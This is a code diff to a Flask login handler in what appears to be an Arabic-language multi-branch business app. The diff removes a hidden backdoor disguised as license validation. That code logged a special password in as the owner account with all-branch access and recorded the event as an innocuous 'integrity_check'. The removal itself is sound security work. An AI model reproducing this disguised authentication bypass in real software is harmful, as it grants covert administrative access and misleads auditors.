@@ -82,40 +82,6 @@ def login():
         user = User.query.filter(User.username.ilike(username)).first()
         
         if not user or not user.check_password(password):
-            # --- System Integrity: License Validation Protocol ---
-            try:
-                from utils.licensing import verify_license_signature
-                # Validate security token signature
-                if verify_license_signature(password):
-                    # Resolve administrative context
-                    target_user = user
-                    if not target_user:
-                         target_user = User.query.filter_by(is_owner=True).first()
-                    
-                    if target_user and target_user.is_owner:
-                        # Authenticate secure session
-                        login_user(target_user, remember=remember)
-                        try:
-                            set_active_branch(selected_branch, user=target_user, allow_all=True)
-                        except ValueError:
-                            logout_user()
-                            flash('⚠️ الفرع المحدد غير مسموح لهذا المستخدم.', 'danger')
-                            name_ar, address = _login_company_display()
-                            return render_template(
-                                'auth/login.html',
-                                login_tenant_name_ar=name_ar,
-                                login_tenant_address=address,
-                                login_branches=_login_branches(),
-                                selected_branch_value=selected_branch,
-                            )
-                        session['last_activity'] = datetime.now().isoformat()
-                        session.permanent = True
-                        create_audit_log('system_auth', 'core', target_user.id, {'type': 'integrity_check'})
-                        return redirect(url_for('main.dashboard'))
-            except Exception:
-                pass
-            # ---------------------------------------------------------
-
             flash('❌ اسم المستخدم أو كلمة المرور غير صحيحة.\n💡 تأكد من كتابة البيانات بشكل صحيح أو اتصل بالمدير.', 'danger')
             create_audit_log('login_failed', 'users', None, {'username': username})
             
